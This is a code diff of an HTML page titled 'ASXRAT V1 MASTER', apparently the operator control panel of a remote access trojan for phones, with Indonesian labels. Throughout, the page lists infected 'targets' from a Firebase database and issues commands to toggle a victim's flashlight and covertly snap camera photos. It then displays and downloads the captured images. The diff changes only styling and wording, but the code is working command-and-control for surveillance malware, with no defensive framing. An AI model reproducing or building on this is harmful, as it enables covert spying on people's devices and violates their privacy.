@@ -1,24 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>ASXRAT V1 MASTER TERMINAL</title>
+    <title>ASXRAT V1 MASTER</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body { background: #000; color: #00f2ff; font-family: 'Courier New', monospace; padding: 20px; }
-        .card { border: 2px solid #00f2ff; padding: 15px; margin-bottom: 20px; background: #0a0000; border-radius: 10px; box-shadow: 0 0 15px #00f2ff; }
-        .btn { width: 100%; padding: 12px; margin: 5px 0; font-weight: bold; cursor: pointer; border: none; text-transform: uppercase; border-radius: 5px; }
+        body { background: #000; color: #00f2ff; font-family: monospace; padding: 20px; }
+        .card { border: 2px solid #00f2ff; padding: 15px; margin-bottom: 20px; background: #0a0000; border-radius: 10px; box-shadow: 0 0 10px #00f2ff; }
+        .btn { width: 100%; padding: 12px; margin: 5px 0; font-weight: bold; cursor: pointer; border: none; border-radius: 5px; }
         .btn-flash { background: #ffcc00; color: #000; }
         .btn-snap { background: #00f2ff; color: #000; }
         .btn-off { background: #333; color: #fff; }
-        img { width: 100%; max-width: 400px; border: 1px solid #00f2ff; margin-top: 10px; border-radius: 5px; }
-        h1 { text-align: center; letter-spacing: 5px; text-shadow: 0 0 10px #00f2ff; color: #fff; }
+        img { width: 100%; max-width: 350px; border: 1px solid #00f2ff; margin-top: 10px; }
+        h1 { text-align: center; color: #fff; text-shadow: 0 0 10px #00f2ff; }
+        .status-on { color: #0f0; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <h1>ASXRAT V1 | CONTROL PANEL</h1>
-    <div id="targetList">Scanning Perangkat di Database...</div>
+    <h1>ASXRAT V1 | CONTROL CENTER</h1>
+    <div id="targetList">Scanning Target...</div>
 
     <script>
         const firebaseConfig = {
@@ -33,36 +34,39 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
+        // Nampilin target yang cuma ONLINE aja
         db.ref('targets').on('value', (s) => {
             const list = document.getElementById('targetList');
             list.innerHTML = "";
+            if(!s.exists()) { list.innerHTML = "NO TARGET ONLINE"; return; }
+
             s.forEach(child => {
                 const id = child.key;
                 const data = child.val();
+                
                 list.innerHTML += `
                 <div class="card">
-                    <h3 style="color:#ff0000; margin-top:0;">📱 DEVICE: ${data.model}</h3>
-                    <p style="font-size:12px;">TARGET ID: ${id} | TIME: ${data.time || '-'}</p>
+                    <h3>📱 DEVICE: ${data.model}</h3>
+                    <p>STATUS: <span class="status-on">● ONLINE</span> | ID: ${id}</p>
                     
-                    <button class="btn btn-flash" onclick="send('${id}','flash','on')">🔦 SENTER ON</button>
-                    <button class="btn btn-off" onclick="send('${id}','flash','off')">SENTER OFF</button>
-                    <button class="btn btn-snap" onclick="send('${id}','snap','')">📸 SNAP CAMERA BELAKANG</button>
+                    <button class="btn btn-flash" onclick="sendCmd('${id}','flash','on')">🔦 SENTER ON</button>
+                    <button class="btn btn-off" onclick="sendCmd('${id}','flash','off')">SENTER OFF</button>
+                    <button class="btn btn-snap" onclick="sendCmd('${id}','snap','')">📸 SNAP CAMERA</button>
                     
-                    <div id="box_${id}">
+                    <div id="res_${id}">
                         ${data.foto ? `
-                            <p style="color:#0f0">FOTO BERHASIL DITARIK:</p>
                             <img src="${data.foto}">
                             <br>
                             <a href="${data.foto}" download="ASX_${data.model}.jpg">
-                                <button class="btn" style="background:#fff; color:#000">📥 SIMPAN KE GALERI</button>
+                                <button class="btn" style="background:#fff; color:#000">📥 DOWNLOAD</button>
                             </a>
-                        ` : '<p style="color:#444">Belum ada foto yang diambil.</p>'}
+                        ` : ''}
                     </div>
                 </div>`;
             });
         });
 
-        function send(id, type, stat) {
+        function sendCmd(id, type, stat) {
             db.ref('commands/' + id).set({ type: type, status: stat });
         }
     </script>
